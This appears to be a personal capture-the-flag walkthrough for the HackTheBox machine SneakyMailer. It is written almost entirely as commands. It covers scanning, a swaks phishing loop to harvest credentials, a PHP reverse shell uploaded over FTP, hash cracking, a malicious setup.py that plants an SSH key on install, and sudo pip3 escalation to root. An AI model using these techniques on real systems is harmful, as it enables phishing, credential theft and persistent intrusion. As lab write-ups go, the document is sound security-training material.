@@ -1,0 +1,142 @@
+IP: 10.10.10.197
+
+rustscan -a 10.10.10.197 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
+
+21/tcp   open  ftp      syn-ack vsftpd 3.0.3
+22/tcp   open  ssh      syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp   open  smtp     syn-ack Postfix smtpd
+80/tcp   open  http     syn-ack nginx 1.14.2
+143/tcp  open  imap     syn-ack Courier Imapd (released 2018)
+993/tcp  open  ssl/imap syn-ack Courier Imapd (released 2018)
+8080/tcp open  http     syn-ack nginx 1.14.2
+
+
+http://sneakycorp.htb/
+
+
+# Copy email table to a txt a filter with awk
+awk -F"\t" '{print $4}' team.txt > emails.txt
+
+# We could validate this e-mails in smtp
+smtp-user-enum -U emails.txt 10.10.10.197 25
+
+# Create a script to send phishing to this emails
+
+for email in $(cat emails.txt);
+do
+  swaks \
+    --from support@sneakymailer.htb \
+    --to $email \
+    --header 'Subject: Please Register Your Account' \
+    --body 'http://10.10.14.21/register.php' \
+    --server sneakycorp.htb
+done
+
+./phishing.sh
+
+# The -k option is used to not close the listener after one connection is made
+sudo nc -lvnkp 80
+
+# Got credentials
+Paul Byrd
+paulbyrd@sneakymailer.htb
+^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+
+# Login in IMAP with Evolution or claws-mail
+
+# Find FTP credentials on Sent Items
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+# Put a reverse shell inside it
+put shell.php
+
+# Enumerate subdomains to find dev.sneakycorp.htb
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.sneakycorp.htb" -u http://sneakycorp.htb
+
+http://dev.sneakycorp.htb/shell.php
+
+# Low User
+
+# There is a another webserver pypi.senakycorp.htb running
+
+# PyPI server is acessible on port 8080 ans asks for credentials
+
+# Find a password password inside /var/www/pypi.sneakycorp.htb/.htpasswd 
+hashcat -m 1600 pypi /usr/share/wordlists/rockyou.txt --user
+
+# Creating ssh keys to use later
+ssh-keygen -f low
+
+# We need to creaate a custom package to upload on PyPI server
+
+mkdir test
+cd test
+mkdir package
+touch setup.cfg; touch setup.py
+touch README.md; touch package/__init__.py
+
+setup.py
+
+from setuptools import setup
+import os
+try:
+        os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsC78LUEtOvubTqZxtYCRSTZXOKlRJbNWYGnCd9/riLVvqcoD9t4s2RF/y34cREVzLx0W4GSak1XO+KDPUppkpv5JDpDUnyCOUhfuMFie+XHBZ4tNYwUqGOZlfsV3AAiTUge+O0hAUBeVjMCn7e2kGiq9LJNlzvImwVyyck0VbXIqI69ArN3ixkD0rbLz+PRNOlxGKQmozSvEKwkg1QMMD2GdXVRkDPe5PneyZrSc9tPs/SYVnNmggZ1SUqiMPNLz4DPz+zAzn/0g7INVXeF1tJmqgVGZdE1T6+17QDK7NQEBsIN3lNVDHFw2NPmA/ptTOaU45jhGmV+fzpK+s4F7EBhdIWZVExrPzbKU2aTr23lLV16U1pLc7WRza4glv64oqk/lzygkBEOncbIfe0caqiNow9ojH6Gi4+FxB40gwa3K5VDc3bzkrsi9Tdz1Uv2wGOEEo8xO1sfBkMs/yEY/e5HsLB45rOLtjTLJtTqw8C0T7CCjkUdUp66gZru3a/rM=' >> ~/.ssh/authorized_keys")
+except:
+        pass
+setup(
+    name='package',
+    packages=['package'],
+    description='Hello world enterprise edition',
+    version='0.1',
+    url='http://github.com/example/linode_example',
+    author='Linode',
+    author_email='docs@linode.com',
+    keywords=['pip','linode','example']
+    )
+
+setup.cfg
+
+[metadata]  
+description-file = README.md
+
+__init__.py
+
+def hello_word():  
+    print("hello world")
+
+export HOME=`pwd`
+touch ~/.pypirc
+
+.pypirc
+
+[distutils]
+index-servers =
+  pypi
+  linode
+[pypi]
+username:
+password:
+[linode]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+
+# Uploading the package
+python setup.py sdist upload -r linode
+
+# Login
+ssh -i low low@10.10.10.197
+
+User Flag --> dc16a4b7691412654784cf1398bbd5cb
+
+Root
+
+sudo -l
+(root) NOPASSWD: /usr/bin/pip3
+
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo /usr/bin/pip3 install $TF
+
+Root Flag --> 32c276c8e6236e6418556145454bdfba
